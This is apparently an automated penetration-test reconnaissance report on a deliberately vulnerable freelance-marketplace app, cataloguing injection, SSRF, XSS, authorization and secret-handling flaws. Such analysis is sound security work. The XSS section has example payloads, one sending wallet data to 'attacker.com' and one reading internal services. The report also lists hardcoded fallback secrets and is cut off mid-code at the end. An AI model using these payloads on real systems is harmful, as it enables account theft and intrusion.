# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the HireFlow freelance marketplace application. All findings have been verified against the scope criteria below.

### In-Scope: Network-Reachable Components
The following components are confirmed as in-scope because their execution can be initiated by network requests the deployed application server receives:
- **Express API endpoints** (`/api/*`) — 77 unique HTTP endpoints across 12 modules
- **Static file serving** (`/uploads`, client SPA) — directory listing and file downloads
- **WebSocket connections** (`/socket.io`, `/messaging` namespace) — real-time messaging and presence
- **Nginx reverse proxy** (port 80) — HTTP ingress for all above
- **Puppeteer PDF generation** — triggered by invoice requests via API
- **Payment webhook receiver** (`/api/webhooks/payment`) — externally-callable without authentication

### Out-of-Scope: Locally Executable Only
The following components cannot be invoked through the running application's network interface:
- **Database migration scripts** (`migrations/20240101000000_initial_schema.js`) — CLI-only via `knex migrate:latest`
- **Seed scripts** (`seeds/001_seed_data.js`, `mongo_seed.js`) — CLI-only via `knex seed:run` / `mongosh`
- **GitHub Actions workflows** (`.github/workflows/`) — CI/CD pipeline only
- **Docker Compose orchestration** (`docker-compose.yml`) — infrastructure provisioning
- **Knex configuration** (`knexfile.js`) — build-time database config
- **Client build tooling** (Vite dev server, npm scripts) — development environment only

---

## 1. Executive Summary

HireFlow is a full-stack Node.js freelance marketplace application with a critically weak security posture. The application handles sensitive financial operations (wallet deposits, escrow management, payment processing) and personal data (user profiles, private messaging, contract details), yet exhibits fundamental security failures across authentication, authorization, input validation, and data protection layers. The codebase appears to be a deliberately vulnerable application ("WebVulnBench") with numerous intentional and unintentional security weaknesses.

The most severe findings include **unauthenticated SQL injection** on the public user search endpoint (`GET /api/users?search=`), enabling complete database compromise without any credentials. A **MongoDB `$where` code injection** on the public gig search endpoint allows arbitrary server-side JavaScript execution. The **payment webhook endpoint** accepts unsigned payloads, allowing any external attacker to credit arbitrary amounts to any user's wallet. Three distinct **Server-Side Request Forgery (SSRF)** vectors allow authenticated users to scan internal infrastructure and access cloud metadata services. **Stored Cross-Site Scripting (XSS)** via `dangerouslySetInnerHTML` in the React frontend allows persistent JavaScript injection affecting all page visitors.

Architecturally, the application uses a dual authentication model (sessions + JWT) with hardcoded fallback secrets that are trivially guessable (`hireflow2024api` for JWT). Security middleware like rate limiting for auth endpoints and file upload restrictions are defined but never applied. CORS is configured to reflect any origin with credentials, CSP is explicitly disabled, and no CSRF protection exists. Financial operations lack database transactions, creating race conditions that enable double-spend attacks. The WebSocket implementation has zero authentication — user identity is a self-asserted query parameter. Combined, these issues present an attack surface where an external attacker can achieve full application compromise, financial fraud, data exfiltration, and lateral movement to internal infrastructure.

## 2. Architecture & Technology Stack

### Framework & Language

The application is built on **Node.js 20** (Alpine Docker image) using **Express 4.17.1** as the HTTP framework. The frontend is a **React 18.2.0** single-page application built with **Vite 5.0.8**, served as static files through the Express backend. Real-time communication uses **Socket.IO 4.7.2** for WebSocket connections. The Express application uses a standard middleware chain: `cors`, `helmet` (with CSP disabled), `compression`, `morgan` for logging, `express.json` (10MB body limit), `cookie-parser`, and `express-session` with Redis-backed storage. From a security perspective, Express 4.x is a mature framework but the configuration choices — disabling CSP, enabling open CORS, not applying auth-specific rate limiting — undermine its built-in protections.

The data layer uses a polyglot persistence strategy: **PostgreSQL 15** (via Knex.js 3.1.0) for relational data (users, contracts, wallets, transactions, projects, proposals, reviews, disputes), **MongoDB 7** (via Mongoose 5.13.0) for the gig catalog and activity logs, and **Redis 7** (via ioredis 5.3.2) for session storage. File storage uses **MinIO** (S3-compatible object storage) accessed via the `minio` npm package. PDF invoice generation uses **Puppeteer 21.6.1** running Chromium with `--no-sandbox`. Email is sent via **Nodemailer 6.9.7** to a MailHog SMTP relay in development. Image processing uses **sharp 0.33.1** for avatar resizing. This stack introduces multiple trust boundaries between distinct data stores, each with its own query language and injection surface.

### Architectural Pattern

The application follows a **feature-based monolith** pattern with a loose MVC structure. Each feature module (`src/auth/`, `src/users/`, `src/gigs/`, etc.) contains its own `routes.js`, `controller.js`, and `service.js` files. Routes define Express router middleware chains, controllers handle HTTP request/response parsing, and services contain business logic and database queries. This separation is inconsistently applied — some controllers directly construct database queries, and some services handle HTTP-specific concerns. The lack of a consistent data access layer means SQL and NoSQL injection vulnerabilities appear in both controller and service files, requiring exhaustive review of both layers.

### Critical Security Components

| Component | Technology | Security Implication |
|-----------|-----------|---------------------|
| Authentication | JWT + Express Session | Dual auth with hardcoded secrets; no token revocation |
| Password Hashing | bcryptjs (4 rounds) | Far below minimum recommended 10-12 rounds |
| Session Store | Redis (no auth) | Session hijacking if Redis is network-accessible |
| File Upload | Multer (no restrictions on 2/4 handlers) | Arbitrary file upload and serving |
| PDF Generation | Puppeteer (--no-sandbox) | Server-side XSS → SSRF via HTML injection |
| CORS | `origin: true, credentials: true` | Any origin can make authenticated requests |
| Rate Limiting | express-rate-limit (auth limiter unused) | Brute-force protection not applied to auth endpoints |
| Input Validation | express-validator (partially applied) | Only auth and project routes validated |

### Deployment Architecture

All services run in Docker containers orchestrated by Docker Compose v3.8. **Nginx** on port 80 acts as a reverse proxy to the Express app on port 3000. Critically, all internal services are exposed on host ports: PostgreSQL (5432), MongoDB (27017), Redis (6379), MinIO (9000/9001), and MailHog (1025/8025). There is no TLS anywhere — not on Nginx, not on database connections, and not on inter-service communication. The Express app is also directly accessible on port 3000, bypassing Nginx entirely. MinIO buckets `avatars` and `gig-images` are configured with anonymous download access via `mc anonymous set download`.

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms

The application implements a **dual authentication system** supporting both session-based and JWT bearer token authentication. The `authenticate` middleware (`src/middleware/auth.js`, lines 6-41) first checks for `req.session.userId` (session auth), then falls back to validating an `Authorization: Bearer <token>` header (JWT auth). Both paths load the full user record from PostgreSQL and attach it to `req.user`.

**Critical auth bypass vulnerability:** On line 36 of `src/middleware/auth.js`, unexpected JWT errors (anything other than `JsonWebTokenError` or `TokenExpiredError`) result in `return next()` instead of returning a 401 response. This means if the database query fails or any unexpected error occurs during JWT processing, the request proceeds to the next handler **without authentication**, with `req.user` undefined. Downstream handlers that don't explicitly check for `req.user` existence will process unauthenticated requests.

**JWT Configuration:** The JWT secret defaults to `'hireflow2024api'` (`src/config/index.js`, line 30) — a 15-character predictable string. If the `JWT_SECRET` environment variable is not set, any attacker can forge valid tokens for any user/role including superadmin. Tokens expire after 7 days with no refresh mechanism and no revocation/blacklist capability. The JWT payload includes `id`, `email`, `role`, and `walletBalance` — leaking PII and financial data in every request since JWTs are base64-encoded, not encrypted. Logout for JWT clients is purely client-side; the token remains valid server-side until expiry.

**Authentication Endpoints:**

| Endpoint | Method | File | Notes |
|----------|--------|------|-------|
| `/api/auth/register` | POST | `src/auth/auth.routes.js:8` | Public; user can set own role (client/freelancer) |
| `/api/auth/login` | POST | `src/auth/auth.routes.js:26` | Public; returns both session cookie and JWT |
| `/api/auth/logout` | POST | `src/auth/auth.routes.js:35` | Public; destroys session only (JWT unaffected) |
| `/api/auth/forgot-password` | POST | `src/auth/auth.routes.js:37` | Public; user enumeration via 404 response |
| `/api/auth/reset-password` | POST | `src/auth/auth.routes.js:39` | Public; predictable token, 24h validity |
| `/api/auth/verify-email/:token` | GET | `src/auth/auth.routes.js:41` | Public; token-based email verification |
| `/api/auth/me` | GET | `src/auth/auth.routes.js:43` | Authenticated; returns current user profile |

### Session Management and Cookie Security

Sessions are managed via `express-session` with Redis-backed storage (`connect-redis`). The session configuration is defined in `src/index.js`, lines 60-71:

```javascript
app.use(session({
  store: sessionStore,
  secret: config.session.secret,  // fallback: 'hireflow-session-key-change-in-production'
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: config.env === 'production',
    httpOnly: true
    // Missing: sameSite, maxAge, domain, path
  }
}));
```

**Cookie flags configured at `src/index.js` lines 67-68:**
- `httpOnly: true` — **Set** (prevents JavaScript access to session cookie)
- `secure: config.env === 'production'` — **Conditionally set** (but note: the error handler at `src/middleware/errorHandler.js:35` checks `process.env.NODE_ENV !== 'Production'` with a capital P, suggesting inconsistent environment variable casing that could prevent `secure` from ever being `true`)
- `SameSite` — **NOT SET** (missing entirely, leaving sessions vulnerable to CSRF)
- `maxAge` — **NOT SET** (sessions persist until Redis evicts them)

The session secret fallback `'hireflow-session-key-change-in-production'` (`src/config/index.js`, line 25) is a weak, predictable default. If the `SESSION_SECRET` environment variable is unset, an attacker can forge session cookies.

### Authorization Model and Bypass Scenarios

The application uses role-based access control (RBAC) with five roles: `superadmin`, `admin`, `moderator`, `client`, `freelancer`. The RBAC middleware is defined in `src/middleware/rbac.js` (lines 1-43). `requireRole()` checks if `req.user.role` matches the allowed list, with `superadmin` always allowed and `admin` able to access `moderator` routes.

**Authorization bypass scenarios:**
1. **Unauthenticated settings access:** `GET /api/users/:id/settings` (`src/users/users.routes.js:15`) has NO `authenticate` middleware — any user can read any other user's email, phone, timezone.
2. **Contract IDOR:** `GET /api/contracts/:id` (`src/contracts/contracts.controller.js:28-38`) fetches any contract by ID without checking the requester is a party to the contract.
3. **Conversation IDOR:** `GET /api/messages/conversations/:id` (`src/messaging/messaging.controller.js:50-62`) retrieves messages without verifying the requester is a participant.
4. **Escrow release without role check:** `POST /api/payments/escrow/release/:milestoneId` has no role restriction — any authenticated user can attempt to release escrow.
5. **Review mass assignment:** `PUT /api/reviews/:id` (`src/reviews/reviews.service.js:213`) passes the update object with no field whitelist, allowing modification of `reviewer_id`, `reviewee_id`, or `is_public`.
6. **Socket.IO impersonation:** Both WebSocket namespaces (`src/config/socket.js:19`, `src/messaging/messaging.gateway.js:14`) accept `userId` from an unauthenticated query parameter — any client can impersonate any user.

### SSO/OAuth/OIDC Flows

No SSO, OAuth, or OIDC flows are implemented. Authentication is entirely password-based with no multi-factor authentication option.

### Password Security

Passwords are hashed with bcryptjs using only **4 salt rounds** (`src/auth/auth.service.js:8`), far below the recommended 10-12. Password reset tokens are generated deterministically from `SHA-256(email + timestamp)` truncated to 16 hex characters (`src/utils/helpers.js:25-29`), making them brute-forceable if the attacker knows the email and approximate request time. Reset tokens are never cleared after use (`src/auth/auth.controller.js:188`), allowing reuse within the 24-hour validity window (which itself contradicts the 1-hour expiry set in the database).

## 4. Data Security & Storage

### Database Security

**PostgreSQL** stores all relational data including users, wallets, transactions, contracts, messages, and reviews. The schema (`migrations/20240101000000_initial_schema.js`) stores sensitive data without column-level encryption: `password_hash`, `reset_token`, `verification_token`, `phone`, `email`, wallet `balance`, and message `content` are all plaintext. Reset tokens and verification tokens are stored unhashed — if the database is compromised, all tokens are immediately usable. There are no `CHECK` constraints on financial amounts (`balance`, `pending_balance`, `bid_amount`, `total_amount`), meaning negative values are not prevented at the database level. No row-level security policies or database audit triggers exist.

**MongoDB** stores the gig catalog (Mongoose models in `src/models/`) and activity logs. The MongoDB connection uses no authentication and no TLS (`mongodb://localhost:27017/hireflow`). The `$where` operator is used with user-controlled input in gig search (`src/gigs/gigs.service.js:41-45`), enabling arbitrary JavaScript execution on the MongoDB server.

**Redis** stores sessions with no authentication or TLS. The Redis connection (`src/config/redis.js`) has no password configured. Any network-accessible client can read, modify, or delete session data, enabling session hijacking or mass logout attacks.

**Database connections** have no SSL/TLS configured. PostgreSQL, MongoDB, and Redis all communicate over plaintext, exposing credentials and data to network-level interception.

### Data Flow Security

Sensitive financial operations in `src/payments/payments.service.js` lack database transactions. The `withdraw()` function (lines 79-110) reads the wallet balance, checks it's sufficient, then updates — without a transaction, creating a TOCTOU race condition that enables double-spend. The `fundEscrow()` function (lines 116-198) has the same race condition. The `releaseEscrow()` function (lines 204-315) performs four separate database writes (deduct client pending balance, credit freelancer, record two transactions) without a transaction — if any step fails, financial state becomes inconsistent. The `overrideAmount` parameter in `releaseEscrow()` has no validation for positivity, bounds, or integer type.

The `deposit()` function (line 37) only validates `amount > 0` but doesn't check for integer type or `MAX_SAFE_INTEGER` bounds, potentially causing floating-point precision errors in financial calculations.

### Multi-tenant Data Isolation

The application has minimal multi-tenant isolation. Authorization checks are inconsistently applied — some endpoints verify ownership (user profile updates), while others don't (contract details, conversation messages, user settings). There is no database-level row isolation; all data separation relies on application-level `WHERE` clauses which can be bypassed through SQL injection.

### Seed Data Security

The seed file (`seeds/001_seed_data.js`) creates 90+ user accounts (including superadmin and admin accounts) all sharing the password `password123`. Seed data includes realistic-looking Gmail addresses that could be real PII. If seeds are accidentally run in a non-development environment, every account is immediately compromised.

## 5. Attack Surface Analysis

### External Entry Points (In-Scope, Network-Accessible)

**Public Unauthenticated Endpoints (Highest Priority):**

| Endpoint | Method | Module | Critical Risk |
|----------|--------|--------|---------------|
| `/api/users?search=` | GET | Users | **SQL Injection** — string interpolation in raw SQL |
| `/api/gigs?tag_filter=` | GET | Gigs | **NoSQL Code Injection** — `$where` with user input |
| `/api/webhooks/payment` | POST | Integrations | **Auth bypass** — optional signature verification |
| `/api/debug/info` | GET | Core | **Info disclosure** — leaks DB hosts, MongoDB URI, Redis host |
| `/api/users/:id/settings` | GET | Users | **PII exposure** — no auth required |
| `/uploads` | GET | Core | **Directory listing** — browse all uploaded files |
| `/api/auth/forgot-password` | POST | Auth | **User enumeration** — different responses for valid/invalid emails |
| `/api/auth/register` | POST | Auth | **Role selection** — user can self-assign client/freelancer role |
| `/api/auth/login` | POST | Auth | **No auth rate limiting** — brute-force possible |

**Authenticated Endpoints with Critical Vulnerabilities:**

| Endpoint | Method | Module | Critical Risk |
|----------|--------|--------|---------------|
| `/api/webhooks/test` | POST | Integrations | **Full SSRF** — no URL validation, response returned |
| `/api/integrations/import?url=` | GET | Integrations | **Full SSRF** — no URL validation, JSON response returned |
| `/api/messages/conversations/:id/link-preview` | POST | Messaging | **SSRF** — trivially bypassable localhost blocklist |
| `/api/contracts/:id/invoice` | GET | Contracts | **Server-side XSS** — HTML injection via Puppeteer |
| `/api/contracts/:id/milestones/:mid/submit` | POST | Contracts | **Unrestricted file upload** — no type/size filter |
| `/api/messages/conversations/:id/messages` | POST | Messaging | **Unrestricted file upload** — no type/size filter |
| `/api/messages/conversations/:id` | GET | Messaging | **IDOR** — no participant check |
| `/api/contracts/:id` | GET | Contracts | **IDOR** — no party check |
| `/api/payments/wallet/deposit` | POST | Payments | **Race condition** — no transaction wrapping |
| `/api/payments/wallet/withdraw` | POST | Payments | **Race condition** — double-spend possible |
| `/api/payments/escrow/release/:mid` | POST | Payments | **No role check** — any user can release escrow |

**WebSocket Attack Surface:**
- **Default namespace `/`** (`src/config/socket.js`) — CORS: `origin: '*'`, auth: none (userId from query parameter)
- **`/messaging` namespace** (`src/messaging/messaging.gateway.js`) — auth: none; allows sending, editing, and deleting messages as any user

### Internal Service Communication

All inter-service communication is over plaintext TCP within the Docker network. The Express application connects to PostgreSQL (port 5432), MongoDB (port 27017), Redis (port 6379), MinIO (port 9000), and MailHog (port 1025) without TLS. No mutual TLS or service-level authentication exists between the application and its backing services. All services are also exposed on host ports, meaning they are directly accessible if the Docker host is network-reachable.

### Input Validation Patterns

Input validation is **inconsistently applied**. The `express-validator` library is used on auth routes (registration, login) and project routes, but most other modules (contracts, disputes, messaging, payments, reviews) have **no input validation at all**. Several endpoints pass `req.body` or `req.query` directly to service functions without any sanitization. The most dangerous examples:
- `src/users/users.service.js:33` — `search` query param interpolated into raw SQL
- `src/gigs/gigs.service.js:41-45` — `tag_filter` query param injected into MongoDB `$where`
- `src/admin/admin.service.js:66` — `search` concatenated into `whereRaw`
- `src/admin/admin.service.js:360-362` — `usernames` array concatenated into JSON for MongoDB query

### Background Processing

Puppeteer-based PDF generation (`src/utils/pdf.js`) is triggered by contract invoice requests and runs headless Chromium with `--no-sandbox`. User-controlled data (display names, milestone titles) is interpolated into HTML templates without escaping, creating a server-side XSS → SSRF chain. Socket.IO events are processed asynchronously for real-time messaging, with no authentication or rate limiting on event handlers.

### Out-of-Scope Components

| Component | Reason for Exclusion |
|-----------|---------------------|
| `migrations/20240101000000_initial_schema.js` | Database migration, CLI-only (`knex migrate:latest`) |
| `seeds/001_seed_data.js` | Database seeding, CLI-only (`knex seed:run`) |
| `mongo_seed.js` | MongoDB seeding, CLI-only (`mongosh < mongo_seed.js`) |
| `knexfile.js` | Build-time Knex configuration |
| `.github/workflows/` | CI/CD pipeline definitions |
| `docker-compose.yml` | Container orchestration (informational for infrastructure analysis) |
| `client/vite.config.js` | Frontend build tooling |

## 6. Infrastructure & Operational Security

### Secrets Management

Secrets are managed through environment variables with hardcoded fallback defaults in `src/config/index.js`. Every secret has a weak, predictable default that is used if the corresponding environment variable is unset:

| Secret | Env Variable | Fallback Value | File:Line |
|--------|-------------|---------------|-----------|
| JWT signing key | `JWT_SECRET` | `hireflow2024api` | `src/config/index.js:30` |
| Session secret | `SESSION_SECRET` | `hireflow-session-key-change-in-production` | `src/config/index.js:25` |
| PostgreSQL password | `PG_PASSWORD` | `hireflow_dev_2024` | `src/config/index.js:12` |
| MinIO access key | `MINIO_ACCESS_KEY` | `hireflow` | `src/config/index.js:37` |
| MinIO secret key | `MINIO_SECRET_KEY` | `hireflow123` | `src/config/index.js:38` |

The `.env.example` file contains production-styled values (e.g., `JWT_SECRET=hf-prod-jwt-K8sD3ployM3nt-v2`, `MINIO_ACCESS_KEY=AKIAIOSFODNN7HIREFLOW`) that, while appearing to be examples, could be mistakenly used in deployment. No secrets rotation mechanism, vault integration, or key management service is used.

### Configuration Security

**Nginx** (`nginx/default.conf`) serves HTTP only (port 80) with no TLS, no security headers (HSTS, X-Content-Type-Options, X-Frame-Options, CSP, Referrer-Policy), no rate limiting, and a 50MB body size limit. The `proxy_pass` directive forwards all `/api`, `/uploads`, and `/socket.io` traffic to the Express app with no additional filtering.

**No HSTS** (`Strict-Transport-Security`) is configured anywhere — neither in Nginx nor in Express middleware. Since Nginx serves only HTTP, there's no HTTPS to enforce.

**No `Cache-Control`** headers are configured for sensitive API responses. Financial data, user settings, and private messages may be cached by intermediary proxies or browsers.

**Helmet** is configured in Express (`src/index.js:50-53`) but with `contentSecurityPolicy: false` and `crossOriginEmbedderPolicy: false`, disabling the two most impactful security headers. The remaining Helmet defaults (`X-Content-Type-Options`, `X-Frame-Options`, `X-XSS-Protection`) are applied but insufficient without CSP.

### External Dependencies

| Dependency | Version | Security Concern |
|-----------|---------|-----------------|
| `express` | ^4.17.1 | Mature, regularly patched |
| `jsonwebtoken` | ^8.5.1 | Check for CVEs in older versions |
| `bcryptjs` | ^2.4.3 | Safe library, but misconfigured (4 rounds) |
| `mongoose` | ^5.13.0 | Older major version; check for prototype pollution |
| `puppeteer` | ^21.6.1 | Running with `--no-sandbox` |
| `multer` | ^1.4.3 | Check for path traversal CVEs |
| `lodash` | (indirect) | Check for prototype pollution |
| `sharp` | ^0.33.1 | Image processing — check for memory exhaustion |
| `serve-index` | (used) | Enables directory listing of uploads |

### Monitoring & Logging

Logging uses **Winston 3.11.0** (`src/config/logger.js`) and **Morgan** for HTTP request logging. There is no evidence of security-specific event logging — failed login attempts, authorization failures, rate limit hits, and SSRF attempts are not specifically logged or alerted on. The error handler (`src/middleware/errorHandler.js`) logs errors but includes stack traces in HTTP responses when `NODE_ENV !== 'Production'` (note the capital P, meaning production environments with `NODE_ENV=production` will also leak stack traces).

## 7. Overall Codebase Indexing

The codebase follows a feature-modular structure rooted in the `src/` directory, with 16 subdirectories representing distinct application domains: `admin`, `auth`, `config`, `contracts`, `disputes`, `gigs`, `integrations`, `messaging`, `middleware`, `models`, `notifications`, `payments`, `projects`, `proposals`, `reviews`, `users`, and `utils`. Each feature module typically contains three files — `routes.js` (Express router definitions), `controller.js` (HTTP request/response handling), and `service.js` (business logic and database queries) — though this pattern is not uniformly applied. The `middleware/` directory contains cross-cutting concerns: `auth.js` (authentication), `rbac.js` (role-based access control), `rateLimiter.js` (rate limiting definitions), `upload.js` (Multer file upload configuration), and `errorHandler.js` (global error handling). The `config/` directory holds application configuration (`index.js`), database connections (`database.js`), Redis configuration (`redis.js`), MinIO setup (`minio.js`), Socket.IO initialization (`socket.js`), and logging (`logger.js`). The `models/` directory contains Mongoose schemas for MongoDB collections (Gig, ActivityLog). The `utils/` directory provides helper functions (`helpers.js` for token generation, email sending) and PDF generation (`pdf.js` via Puppeteer).

The frontend code in `client/src/` is a React SPA with pages (`pages/`) and shared components (`components/`), using React Router v6 for client-side routing. The client communicates with the backend API via `fetch()` calls with `credentials: 'include'`. Security-relevant client-side code includes `GigDetail.jsx` which uses `dangerouslySetInnerHTML` to render review comments, and `Settings.jsx` which references several API endpoints that don't exist server-side.

The repository uses Docker Compose for development orchestration with 7 services (app, nginx, postgres, mongodb, redis, minio, mailhog). Nginx configuration resides in `nginx/default.conf`. The `migrations/` directory contains a single comprehensive Knex migration defining the PostgreSQL schema. The `seeds/` directory and `mongo_seed.js` provide test data population. No API documentation files (OpenAPI/Swagger), test suites with security tests, or CI security scanning configurations were found. The `.gitignore` excludes `node_modules/`, `.env`, `uploads/*`, `dist/`, and `coverage/`, which are appropriate exclusions. The overall structure makes security-relevant component discovery straightforward for the route/controller/service pattern, but the inconsistent application of middleware (e.g., auth rate limiting defined but never applied) requires careful cross-referencing between middleware definitions and route registrations.

## 8. Critical File Paths

### Configuration
- `src/config/index.js` — Central config with hardcoded secret fallbacks
- `src/config/database.js` — PostgreSQL/Knex connection (no SSL)
- `src/config/redis.js` — Redis connection (no auth)
- `src/config/minio.js` — MinIO client configuration
- `src/config/socket.js` — Socket.IO initialization (wildcard CORS, no auth)
- `src/config/logger.js` — Winston logging configuration
- `nginx/default.conf` — Nginx reverse proxy (HTTP only, no security headers)
- `docker-compose.yml` — Container orchestration with exposed ports
- `Dockerfile` — Node.js 20 Alpine with Chromium for Puppeteer
- `.env.example` — Environment variable template with production-styled secrets
- `knexfile.js` — Database connection configuration

### Authentication & Authorization
- `src/middleware/auth.js` — Authentication middleware (dual session+JWT, bypass on unexpected errors)
- `src/middleware/rbac.js` — Role-based access control (requireRole, requireAdmin, requireModerator)
- `src/auth/auth.routes.js` — Auth route definitions (register, login, logout, forgot/reset password)
- `src/auth/auth.controller.js` — Auth HTTP handlers (user enumeration, reset token expiry mismatch)
- `src/auth/auth.service.js` — Auth business logic (bcrypt 4 rounds, JWT with wallet balance, token generation)
- `src/utils/helpers.js` — Token generation (predictable reset tokens), email sending

### API & Routing
- `src/index.js` — Express app setup (middleware chain, debug endpoint, upload directory listing, route mounting)
- `src/users/users.routes.js` — User routes (unauthenticated settings endpoint)
- `src/gigs/gigs.routes.js` — Gig routes (public search with NoSQL injection)
- `src/contracts/contracts.routes.js` — Contract routes (unrestricted file upload)
- `src/payments/payments.routes.js` — Payment routes (financial operations)
- `src/messaging/messaging.routes.js` — Messaging routes (SSRF link preview, unrestricted file upload)
- `src/integrations/webhook.routes.js` — Webhook/integration routes (SSRF, payment webhook)
- `src/admin/admin.routes.js` — Admin routes (SQL injection in search)
- `src/reviews/reviews.routes.js` — Review routes (mass assignment)
- `src/projects/projects.routes.js` — Project routes (with validation)
- `src/proposals/proposals.routes.js` — Proposal routes
- `src/disputes/disputes.routes.js` — Dispute routes
- `src/notifications/notifications.routes.js` — Notification routes

### Data Models & DB Interaction
- `migrations/20240101000000_initial_schema.js` — Full PostgreSQL schema (no encryption, no CHECK constraints)
- `src/models/Gig.js` — Mongoose gig schema
- `src/models/ActivityLog.js` — Mongoose activity log schema
- `src/users/users.service.js` — User service (**SQL injection on line 33**)
- `src/gigs/gigs.service.js` — Gig service (**NoSQL $where injection on lines 41-45**)
- `src/payments/payments.service.js` — Payment service (race conditions, no transactions)
- `src/contracts/contracts.service.js` — Contract service (invoice data for PDF, email HTML injection)
- `src/messaging/messaging.service.js` — Messaging service (IDOR, SSRF link preview)
- `src/admin/admin.service.js` — Admin service (**SQL injection line 66**, **NoSQL injection lines 360-362**)
- `src/reviews/reviews.service.js` — Review service (mass assignment on line 213)

### Dependency Manifests
- `package.json` — Backend dependencies
- `package-lock.json` — Locked dependency versions
- `client/package.json` — Frontend dependencies (if exists)

### Sensitive Data & Secrets Handling
- `src/config/index.js` — All hardcoded secrets (JWT, session, DB passwords, MinIO)
- `.env.example` — Production-styled secret templates
- `src/auth/auth.service.js` — Password hashing (4 rounds), JWT payload with wallet balance
- `src/utils/helpers.js` — Predictable reset token generation

### Middleware & Input Validation
- `src/middleware/auth.js` — Authentication (bypass vulnerability)
- `src/middleware/rbac.js` — Authorization roles
- `src/middleware/rateLimiter.js` — Rate limiters (auth/upload limiters defined but unused)
- `src/middleware/upload.js` — File upload config (2 unrestricted handlers)
- `src/middleware/errorHandler.js` — Error handling (stack trace leak via case-sensitive check)

### Logging & Monitoring
- `src/config/logger.js` — Winston logger configuration
- `src/middleware/errorHandler.js` — Error response handling

### Infrastructure & Deployment
- `Dockerfile` — Application container (Node 20 + Chromium, --no-sandbox)
- `docker-compose.yml` — Full stack with all ports exposed
- `nginx/default.conf` — Reverse proxy (HTTP, no TLS, no security headers)

### Frontend (XSS-Relevant)
- `client/src/pages/GigDetail.jsx` — **dangerouslySetInnerHTML on line 299** (stored XSS)
- `client/src/pages/Settings.jsx` — References non-existent API endpoints
- `client/src/pages/Profile.jsx` — User profile rendering
- `client/src/pages/AdminPanel.jsx` — Admin interface

### WebSocket / Real-Time
- `src/config/socket.js` — Socket.IO setup (no auth, wildcard CORS)
- `src/messaging/messaging.gateway.js` — Messaging WebSocket (no auth, user impersonation)

### Seed / Test Data
- `seeds/001_seed_data.js` — All accounts with password `password123`
- `mongo_seed.js` — MongoDB gig catalog seed data

## 9. XSS Sinks and Render Contexts

### CRITICAL: Stored XSS via dangerouslySetInnerHTML

**File:** `client/src/pages/GigDetail.jsx`, line 299
**Sink:** `dangerouslySetInnerHTML={{ __html: review.comment }}`
**Render Context:** HTML Body Context
**Network-Reachable:** Yes — review comments are submitted via `POST /api/reviews` and rendered on the public gig detail page for all visitors.

Any user can post a review with a `comment` field containing arbitrary HTML/JavaScript (e.g., `<img src=x onerror="fetch('/api/payments/wallet').then(r=>r.json()).then(d=>fetch('http://attacker.com/'+d.balance))">`). The injected script executes in the browser context of every user who views the gig page. Since JWT tokens are stored in `localStorage` (accessible to JavaScript) and the API uses `credentials: 'include'` for session cookies, an attacker can steal authentication tokens, read wallet balances, initiate fund transfers, or create a self-propagating XSS worm that posts malicious reviews from compromised accounts.

### HIGH: Server-Side XSS via Puppeteer PDF Generation

**File:** `src/utils/pdf.js`, lines 55-77
**Sink:** `page.setContent(html, { waitUntil: 'networkidle0' })`
**Render Context:** HTML Body Context (headless Chromium)
**Network-Reachable:** Yes — triggered via `GET /api/contracts/:id/invoice`

User-controlled data (`data.clientName` from `client.display_name`, `data.clientEmail`, `data.items[].description` from `milestone.title`) is interpolated directly into HTML template strings without escaping. The resulting HTML is rendered in headless Chromium with `--no-sandbox`. An attacker who sets their display name to `<script>fetch('http://internal-service:port/').then(r=>r.text()).then(t=>document.title=t)</script>` can execute JavaScript in the server-side browser context, enabling SSRF to internal services, local file reads via `file://` protocol, and data exfiltration through the rendered PDF content.

### MEDIUM: Email HTML Injection

**File:** `src/contracts/contracts.service.js`, lines 296-299, 386-387
**Sink:** String interpolation into `html` property of nodemailer `sendMail` options
**Render Context:** HTML Body Context (email client)
**Network-Reachable:** Yes — triggered by milestone submission and revision request endpoints

User-controlled values (`milestone.title`, `contract.title`, `reason` from `req.body.reason`) are interpolated into email HTML without escaping. While most email clients strip `<script>` tags, HTML injection for phishing (fake links, deceptive content) remains possible. For example, a milestone title of `<a href="http://attacker.com/fake-login">Click to verify your payment</a>` would render as a clickable link in the notification email.

### SQL Injection Sinks (Database Context)

**File:** `src/users/users.service.js`, line 33
**Sink:** Template literal string interpolation into raw SQL query
**Network-Reachable:** Yes — `GET /api/users?search=PAYLOAD` (public, unauthenticated)
**Severity:** CRITICAL — Full database compromise via `UNION SELECT` to extract password hashes, reset tokens, wallet balances.

**File:** `src/admin/admin.service.js`, line 66
**Sink:** String concatenation into `whereRaw()`
**Network-Reachable:** Yes — `GET /api/admin/users?search=PAYLOAD` (requires admin auth)
**Severity:** HIGH — SQL injection in admin search enables privilege escalation or data extraction.

### NoSQL Injection Sinks (MongoDB Context)

**File:** `src/gigs/gigs.service.js`, lines 41-45
**Sink:** User input in MongoDB `$where` JavaScript function body
**Network-Reachable:** Yes — `GET /api/gigs?tag_filter=PAYLOAD` (public, unauthenticated)
**Severity:** CRITICAL — Arbitrary JavaScript execution on MongoDB server; potential RCE depending on MongoDB version and configuration.

**File:** `src/admin/admin.service.js`, lines 360-362
**Sink:** String concatenation to build JSON MongoDB query filter
**Network-Reachable:** Yes — `GET /api/admin/reports/activity?usernames=PAYLOAD` (requires admin auth)
**Severity:** HIGH — MongoDB operator injection via crafted username values.

## 10. SSRF Sinks

### SSRF Sink #1: Webhook Test — Full SSRF, No Validation

**File:** `src/integrations/webhook.service.js`, lines 139-189
**Route:** `POST /api/webhooks/test` (authenticated)
**User Input:** `req.body.url` — completely attacker-controlled
**Validation:** NONE — no hostname blocklist, no IP check, no protocol restriction beyond `http:`/`https:`

```javascript
async function testWebhook(url) {
  const parsed = new URL(url);
  const transport = parsed.protocol === 'https:' ? https : http;
  const req = transport.request(options, (res) => {
    // Response body returned to attacker (truncated to 500 bytes)
  });
}
```

**Response returned:** Yes — up to 500 bytes of response body plus HTTP status code. This is a **full read SSRF**.
**Reachable targets:** All internal Docker services (postgres:5432, mongodb:27017, redis:6379, minio:9000, mailhog:1025), cloud metadata (169.254.169.254), any internal network host.
**Attack method:** POST — sends a JSON test payload to the target URL.
**Severity:** CRITICAL

### SSRF Sink #2: Profile Import — Full SSRF, JSON Response

**File:** `src/integrations/webhook.service.js`, lines 196-248
**Route:** `GET /api/integrations/import?url=` (authenticated)
**User Input:** `req.query.url` — completely attacker-controlled
**Validation:** NONE

```javascript
async function importProfile(url) {
